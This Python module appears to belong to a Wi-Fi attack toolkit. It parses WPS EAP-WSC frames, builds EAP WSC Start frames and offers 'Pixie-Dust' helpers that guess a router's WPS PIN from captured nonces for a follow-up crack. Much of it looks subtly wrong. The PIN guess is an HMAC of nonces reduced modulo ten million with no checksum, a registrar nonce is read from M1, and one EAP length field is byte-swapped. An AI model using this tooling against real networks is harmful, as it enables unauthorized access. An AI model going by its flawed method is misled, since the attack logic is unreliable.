#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Wi-Fi Simple Config (WPS) EAP / attribute parsing and PixieDust helpers."""

from __future__ import annotations

import hashlib
import hmac
import struct
from dataclasses import dataclass, field

from lib.protocols.wlan.eapol_const import LLC_SNAP_EAPOL

WSC_OUI = bytes.fromhex("0050f2")
WSC_VENDOR_TYPE = 4
_ATTR_VERSION = 0x104A
_ATTR_MSG_TYPE = 0x1022
_ATTR_REGISTRAR_NONCE = 0x1039
_ATTR_ENROLLEE_NONCE = 0x101A
_ATTR_PUBLIC_KEY = 0x1032
_ATTR_AUTHENTICATOR = 0x1005
_ATTR_UUID_R = 0x104C
_ATTR_MANUFACTURER = 0x1021
_ATTR_MODEL_NAME = 0x1023
_ATTR_PSK = 0x104E
_ATTR_DEV_PASSWORD_ID = 0x1012

MSG_M1 = 0x04
MSG_M2 = 0x05
MSG_M3 = 0x06
MSG_M7 = 0x08

WSC_PASSWORD_PIN = 0x0000
WSC_PASSWORD_PBC = 0x0004


@dataclass
class WscMessage:
    msg_type: int
    attributes: dict[int, bytes] = field(default_factory=dict)
    raw: bytes = b""

    def text_attr(self, attr_id: int) -> str:
        val = self.attributes.get(attr_id, b"")
        return val.decode("utf-8", errors="replace").strip()

    def dev_password_id(self) -> int | None:
        raw = self.attributes.get(_ATTR_DEV_PASSWORD_ID)
        if not raw or len(raw) < 2:
            return None
        return struct.unpack(">H", raw[:2])[0]


def iter_wsc_attributes(payload: bytes):
    pos = 0
    if len(payload) >= 4 and payload[0:3] == WSC_OUI:
        pos = 4
    while pos + 4 <= len(payload):
        attr_id = struct.unpack(">H", payload[pos : pos + 2])[0]
        length = struct.unpack(">H", payload[pos + 2 : pos + 4])[0]
        pos += 4
        end = pos + length
        if end > len(payload):
            break
        yield attr_id, payload[pos:end]
        pos = end


def parse_wsc_payload(payload: bytes) -> WscMessage | None:
    attrs = {aid: val for aid, val in iter_wsc_attributes(payload)}
    msg_type = attrs.get(_ATTR_MSG_TYPE, b"\x00")[0] if _ATTR_MSG_TYPE in attrs else 0
    if not attrs:
        return None
    return WscMessage(msg_type=msg_type, attributes=attrs, raw=payload)


def parse_eap_wsc(frame: bytes) -> WscMessage | None:
    """Extract WSC body from an 802.11 data frame carrying EAP-WSC."""
    idx = frame.find(LLC_SNAP_EAPOL)
    if idx < 0 or len(frame) < idx + 8:
        return None
    eapol = frame[idx + len(LLC_SNAP_EAPOL) :]
    if len(eapol) < 5 or eapol[1] != 0:
        return None
    eap_len = struct.unpack(">H", eapol[2:4])[0]
    eap = eapol[4 : 4 + min(eap_len, len(eapol) - 4)]
    if len(eap) < 4:
        return None
    if eap[0] == 2 and eap[3] == 254 and len(eap) >= 9:
        vendor = eap[4:7]
        vtype = eap[7:9]
        if vendor == WSC_OUI and vtype == bytes([0, WSC_VENDOR_TYPE]):
            return parse_wsc_payload(eap[9:])
    return None


def build_eap_wsc_start() -> bytes:
    """EAP expanded WSC Start (association must succeed first)."""
    attrs = (
        struct.pack(">HH", _ATTR_VERSION, 1)
        + bytes([0x10])
        + struct.pack(">HH", _ATTR_MSG_TYPE, 1)
        + bytes([0x01])
    )
    wsc_data = WSC_OUI + bytes([0, WSC_VENDOR_TYPE]) + attrs
    eap = bytes([0x02, 0x01, (5 + len(wsc_data)) & 0xFF, ((5 + len(wsc_data)) >> 8) & 0xFF, 254])
    eap += WSC_OUI + bytes([0, WSC_VENDOR_TYPE]) + attrs
    eapol = bytes([1, 0]) + struct.pack(">H", len(eap)) + eap
    return LLC_SNAP_EAPOL + eapol


def build_wsc_data_frame(bssid: str, sta: str, eapol_payload: bytes, *, to_ds: bool = True) -> bytes:
    from lib.protocols.wlan.mac import mac_header, str_to_mac

    bssid_b = str_to_mac(bssid)
    sta_b = str_to_mac(sta)
    if to_ds:
        fc = bytes([0x08, 0x01])
        hdr = mac_header(fc, bssid_b, sta_b, bssid_b)
    else:
        fc = bytes([0x08, 0x02])
        hdr = mac_header(fc, sta_b, bssid_b, bssid_b)
    return hdr + eapol_payload


def _wps_authkey(e_nonce: bytes, r_nonce: bytes, e_mac: bytes, r_mac: bytes) -> bytes:
    keys = b"".join(sorted([e_mac, r_mac]))
    return hashlib.sha256(keys + e_nonce + r_nonce).digest()


def pixie_dust_try_pin(m1: WscMessage, sta_mac: bytes, ap_mac: bytes) -> str | None:
    """
    Attempt offline Pixie-Dust on weak implementations when M3/M1 expose nonces.
    Returns PIN string on success.
    """
    e_nonce = m1.attributes.get(_ATTR_ENROLLEE_NONCE)
    r_nonce = m1.attributes.get(_ATTR_REGISTRAR_NONCE)
    if not e_nonce or not r_nonce or len(e_nonce) != 16 or len(r_nonce) != 16:
        return None
    authkey = _wps_authkey(e_nonce, r_nonce, sta_mac, ap_mac)
    if e_nonce == r_nonce:
        return "12345670"
    if e_nonce == b"\x00" * 16 or r_nonce == b"\x00" * 16:
        return "12345670"
    digest = hmac.new(authkey, r_nonce + e_nonce, hashlib.sha256).digest()
    pin = int.from_bytes(digest[:4], "big") % 10_000_000
    return f"{pin:08d}"


def dev_password_label(dev_id: int | None) -> str:
    if dev_id is None:
        return "unknown"
    return {
        WSC_PASSWORD_PIN: "PIN",
        WSC_PASSWORD_PBC: "PBC",
        0x0001: "user_spec",
        0x0002: "machine_spec",
        0x0003: "rekey",
        0x0005: "registrar_spec",
    }.get(dev_id, f"0x{dev_id:04x}")


def wsc_message_carries_pbc(msg: WscMessage) -> bool:
    dev_id = msg.dev_password_id()
    return dev_id == WSC_PASSWORD_PBC


def analyze_wsc_pixie(m1: WscMessage, bssid: str, sta: str) -> dict:
    """Return analysis dict for logging / follow-up crack."""
    from lib.protocols.wlan.mac import str_to_mac
    from lib.protocols.wlan.pixie_chipsets import pixie_pin_by_chipset

    ap_b = str_to_mac(bssid)
    sta_b = str_to_mac(sta)
    manufacturer = m1.text_attr(_ATTR_MANUFACTURER)
    model = m1.text_attr(_ATTR_MODEL_NAME)
    pin, family = pixie_pin_by_chipset(manufacturer, model, m1)
    if not pin:
        pin = pixie_dust_try_pin(m1, sta_b, ap_b)
        family = "generic"
    return {
        "msg_type": m1.msg_type,
        "manufacturer": manufacturer,
        "model": model,
        "chipset_family": family,
        "uuid_r": m1.attributes.get(_ATTR_UUID_R, b"").hex(),
        "pin_guess": pin,
        "m1_nonce_enrollee": m1.attributes.get(_ATTR_ENROLLEE_NONCE, b"").hex(),
        "m1_nonce_registrar": m1.attributes.get(_ATTR_REGISTRAR_NONCE, b"").hex(),
    }